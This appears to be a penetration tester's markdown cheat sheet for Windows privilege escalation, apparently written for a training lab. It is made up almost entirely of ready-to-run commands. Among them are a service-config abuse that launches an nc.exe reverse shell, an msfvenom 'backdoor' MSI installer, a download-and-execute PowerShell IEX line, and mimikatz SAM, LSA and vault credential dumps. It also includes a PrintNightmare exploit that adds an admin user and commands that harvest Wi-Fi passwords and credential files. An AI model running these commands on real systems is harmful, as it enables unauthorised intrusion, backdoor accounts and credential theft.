Hostname `hostname`
	

## PrivEsc Relevant

##### Users
```powershell
Get-LocalUser
```
Alternative: `net user`
```powershell
Get-LocalGroup
```
Alternative: `net localgroup`
Of interest: Non-standard groups, _Administrators_, _Backup Operators_ (Universal file access), _Remote Desktop Users_ (RDP), and _Remote Management Users_ (WinRM)
```powershell
Get-LocalGroupMember Administrators
```
	
Alternative: `net localgroup Administrators`
##### Privileges:
```powershell
whoami /all
```

```powershell
reg query "HKU\S-1-5-19"
```
_SeImpersonatePrivilege_ or _SeAssignPrimaryToken_ -> Named Pipes [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) or Juicy/Rotten/Sweet Potato
Also of interest: _SeBackupPrivilege_, _SeLoadDriver_, and _SeDebug_
[Full Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges)
Example for administrative, non-vulnerable account:
	```
	Group Name                                                    Type             SID          Attributes
	============================================================= ================ ============ ==================================================
	Everyone                                                      Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\Local account and member of Administrators group Well-known group S-1-5-114    Group used for deny only
	BUILTIN\Administrators                                        Alias            S-1-5-32-544 Group used for deny only
	BUILTIN\Users                                                 Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\REMOTE INTERACTIVE LOGON                         Well-known group S-1-5-14     Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\INTERACTIVE                                      Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\Authenticated Users                              Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\This Organization                                Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\Local account                                    Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
	LOCAL                                                         Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
	NT AUTHORITY\NTLM Authentication                              Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
	Mandatory Label\Medium Mandatory Level                        Label            S-1-16-8192
	``` https://learn.microsoft.com/de-de/windows-server/identity/ad-ds/manage/understand-special-identities-groups

##### With access to local or network service account
https://github.com/itm4n/FullPowers
##### Bypass UAC
http://pwnwiki.io/#!privesc/windows/uac.md
##### Working Dir for attack
```powershell
Get-ChildItem "C:\Program Files" -Recurse | Get-ACL | ?{$_.AccessToString -match "Everyone\sAllow\s\sModify"}
```
	
##### SysInfo
```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
	
(See: https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions)
##### Interesting user files
```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -Include *password* -Include proof.txt -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
```

```powershell
Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
```

```shell
dir /s *pass* == *cred* == *vnc* == *.config*
```

```
findstr /si password *.xml *.ini *.txt
```

##### Network Shares
```
net share
```

##### Running processes
```powershell
tasklist /SVC
```
	
(Alternative: `Get-Process`)
Standard processes:
	AggregatorHost
	CompatTelRunner
	conhost
	csrss
	ctfmon
	dllhost
	dwm
	fontdrvhost
	LogonUI
	lsass
	MicrosoftEdgeUpdate
	msdtc
	MsMpEng
	rdpclip
	RuntimeBroker
	SearchHost
	SearchIndexer
	SecurityHealthSystray/-Service
	services
	SgrmBroker
	ShellExperienceHost
	sihost
	smss
	StartMenuExperienceHost
	svchost
	taskhostw
	tasklist
	vm3dservice
	vmtoolsd
	wininit
	winlogon
	WmiApSrv
	WmiPrvSE
	WUDFHost
##### Environmet Variables
`set` and `Get-ChildItem Env: | ft Key,Value`

##### Installed programs
```powershell
wmic product get name"," version"," vendor
```
	
 Alternative: `Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname` (32-bit) and `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname`. Also, check the _Program Files_ directories as this list might be incomplete
##### Services
```powershell
wmic service get name","displayname","pathname","startmode |findstr /i "auto" |findstr /i /v "c:\windows\\"
```
Alternatives: `Get-Service` or
```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,StartMode,PathName | Where-Object {$_.State -like 'Running'}
```

Check if non-default services have files with lax write-permissions (W or F):
```powershell
icacls $file
```
Alternative: `Get-ACL`

Check if any of the pathnames are **unquoted** but contain spaces. e.g. with: `wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """` or `gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name`
##### Modifiable Services:
```powershell
accesschk.exe -accepteula -wuqvc "Everyone" *
```
Sysinternals. Also try with  `"Users"` and `"Authenticated Users"`
Look for GENERIC_WRITE, GENERIC_ALL, or SERVICE_CHANGE_CONFIG to abuse. Look for WRITE_DAC or WRITE_OWNER to allow SERVICE_CHANGE_CONFIG
Abuse with `sc config <vulnerableService> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"; sc config <vulnerableService> obj= ".\LocalSystem" password= ""; net start <vulnerableService>`)
##### Scheduled tasks
> Always run as SYSTEM under Win2000, XP, and 2003
```powershell
schtasks /query /fo CSV /v | ConvertFrom-Csv | where { $_.Status -ne "Disabled" -and $_."Run As User" -like "SYSTEM" -and $_.TaskPath -notlike "\Microsoft*" }
```
Alternative: `Get-ScheduledTask`, `dir C:\windows\tasks`

Missing binaries?
```powershell
autorunsc64.exe -a t | more
```
(Part of SysInternals - Look for "File Not Found". Also try with `-a s`)

##### Startup
```
wmic startup get caption,command
```
Alternative: `Get-CimInstance Win32_StartupCommand`
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```

##### Systemwide patches
```powershell
wmic qfe get Caption"," Description"," HotFixID"," InstalledOn
```
##### History
```powershell
Get-History; (Get-PSReadlineOption).HistorySavePath
```

##### LOLBAS
https://lolbas-project.github.io/#

##### PowerUp.ps1
https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1
```
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
```

### Registry misconfigurations
PS Alternative to `reg query` -> `Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOF...'`
##### Can .msi's run privileged without UAC?
```powershell
reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
```
(-> `msiexec /quiet /qn /i c:\path\to\file.msi`)
##### Always install elevated
```powershell
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
Abuse with `msfvenom -p windows/adduser USER=backdoor PASS=backdoor123 -f msi -o evil.msi` (or `-f msi-nouac`) and then `msiexec /quiet /qn /i C:\evil.msi`
##### Passwords set by GPOs
Look into `\\hostname\SYSVOL` to find Groups.xml. The AES-Key the password is encrypted with is known. Also look into cPassword attributes in `Services\Services.xml`, `ScheduledTasks\ScheduledTasks.xml`, `Printers\Printers.xml`, `Drives\Drives.xml`, `DataSources\DataSources.xml`. Automation: Powersploit `Get-GPPPassword`. Also:
```powershell
reg query HKLM /f password /t REG_SZ /s; reg query HKCU /f password /t REG_SZ /s
```
##### Creds for User Autologon?
```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword"
```

##### Credential Manager
```
cmdkey /list
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
Abuse with runas: `runas /savecred /user:Administrator "cmd.exe /k whoami"`
##### Weak file/folder permissions
folder
```
accesschk.exe -uwdqs Users c:\; accesschk.exe -uwdqs "Authenticated Users" c:\
```
files
```
accesschk.exe -uwqs Users c:\*.*; accesschk.exe -uwqs "Authenticated Users" c:\*.*
```

##### Can we access any of these files?
```
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
##### Passwords (mimikatz)
```powershell
privilege::debug
```

```powershell
token::elevate
```

```powershell
lsadump::sam
```
(lsadump::lsa /patch ??)
```powershell
vault::cred /patch
```
##### List AV-Products
```
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
```
##### Drivers	
```powershell
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object "Display Name", "Start Mode", "Path"
```
https://www.loldrivers.io/
##### WSL
`wsl whoami`. If wsl is installed, try to change the distros default user, e.g., `./ubuntun1604.exe config --default-user root`. Then exploit with `wsl <reverseshell>`. WSL Filesystem can be found under `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` See [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#hivenightmare)
### From local Admin to NT SYSTEM
`PsExec.exe -i -s cmd.exe`
##### Shadow Copies
```powershell
vssadmin list shadows #Needs local Admin
```
Alternative: `diskshadow list shadows all`
```powershell
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Then access this symlink
### Specific Exploits
##### Potatoes
Hot Potato is patched in MS16-075
Juicy (> Lonely > Rotten) Potato for machines < Windows 10 1809 & Windows Server 2019
For higher versions: Rogue Potato
But: **Sweet Potato can do it all**
Except when the print service is not running. Then try Generic Potato
##### HiveNightmare
CVE-2021–36934, Win 10/11, see [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#hivenightmare)
Check: `icacls C:\Windows\System32\config\SAM` (Must include `BUILTIN\Users:(I)(RX)` to be vulnerable)
Abuse (mimikatz): `token::whoami /full` -> `misc::shadowcopies` ->
```mimikatz
lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY
```
##### PrinterNightmare
CVE-2021-1675/CVE-2021-34527 (see [HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/printnightmare))
Check: `ls \\localhost\pipe\spoolss` (Should NOT say "path does not exist")
Abuse: Transfer `/home/kali/Documents/exploits/Windows/CVE-2021-1675.ps1` to victom -> `Set-ExecutionPolicy Bypass -Scope Process` -> "A" -> `Import-Module .\CVE-2021-1675.ps1` -> `Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"`
##### Concealed Position
[CVE-2021-34481](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34481)
`/home/kali/Documents/exploits/Windows/ConcealedPosition/`
https://github.com/jacob-baines/concealed_position
## Loot for later
##### Home folder
```powershell
dir /B /S /A-D
```

```powershell
Get-ChildItem -Recurse -Path C:\Users\offsec | select Parent,Name
```
	
##### Network interfaces
```powershell
ipconfig /all
```
Alternative: `Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address; Get-DnsClientServerAddress -AddressFamily IPv4 | ft`
##### Firewall settings
```powershell
netsh advfirewall show currentprofile, netsh advfirewall firewall show rule name=all
```
##### Gateways
```powershell
route print
```
Alternative: `Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex`
##### ARP-Cache
```
arp -a
```
Alternative: `Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State`
##### Hosts File
`C:\WINDOWS\System32\drivers\etc\hosts`
##### WLAN passwords
```powershell
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on
```
##### Listeners/Connections
```powershell
netstat -ano
```
##### Powershell Version
```bash
REG QUERY "HKLM\SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine" /v PowerShellVersion
```
##### Mounted Volumes
```powershell
mountvol
```
##### Devices
```powershell
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer
```
##### SNMP
```
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
```
Alternative: `Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse`
##### Softwareverteilung?
```powershell
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```



# Findings